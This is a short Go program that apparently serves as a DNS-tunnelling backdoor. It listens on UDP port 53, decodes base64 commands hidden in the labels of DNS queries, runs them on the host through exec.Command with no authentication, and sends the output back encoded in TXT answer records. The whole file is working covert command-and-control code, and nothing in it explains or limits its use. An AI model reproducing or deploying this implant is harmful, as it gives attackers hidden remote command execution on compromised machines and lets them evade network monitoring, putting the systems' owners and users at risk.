package main

import (
	"strings"
	"bytes"
	"net"
	"os/exec"
	"encoding/base64"
)

var (
	host string = "0.0.0.0"
)

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	addr := net.UDPAddr{
		Port: 53,
		IP: net.ParseIP(host),
	}

	conn, err := net.ListenUDP("udp", &addr)
	check(err)
	defer conn.Close()

	var buff []byte
	for {
		buff = make([]byte, 1024)
		n, addr, err := conn.ReadFromUDP(buff)
		if err != nil {
			continue
		}

		go handleConnection(conn, buff, n, addr)
	}
}

func handleConnection(conn *net.UDPConn, buff []byte, n int, addr *net.UDPAddr) {
	var (
		cmdS string = ""
		ptr int = 12
		size int = int(buff[ptr])
	)

	for size != 0 {
		ptr += 1
		cmdS += string(buff[ptr:ptr+size])
		ptr += size
		size = int(buff[ptr])
		if size != 0 {
			cmdS += "."
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(cmdS)
	if err != nil {
		return
	}
	cmdArgs := strings.Fields(string(decoded))

	var out bytes.Buffer
	if len(cmdArgs) < 1 {
		return
	}
	cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
	cmd.Stdout = &out
	err = cmd.Run()

	response := strings.TrimSpace(out.String())
	if err != nil {
		response = "error"
	}

	encoded := base64.StdEncoding.EncodeToString([]byte(response))

	requestLength := ptr + 5
	respLen := len(encoded)
	resp := make([]byte, requestLength)
	copy(resp[:12], []byte{buff[0], buff[1], 0x81, 0x80, 0x00, 0x01, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x00})
	copy(resp[12:requestLength], buff[12:])

	answer := []byte{0xc0, 0x0c, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x13, 0x37,
	0x00, byte(respLen + 1), byte(respLen)}
	answer = append(answer, []byte(encoded)...)
	resp = append(resp, answer...)

	_, err = conn.WriteToUDP(resp, addr)
	if err != nil {
		return
	}
}
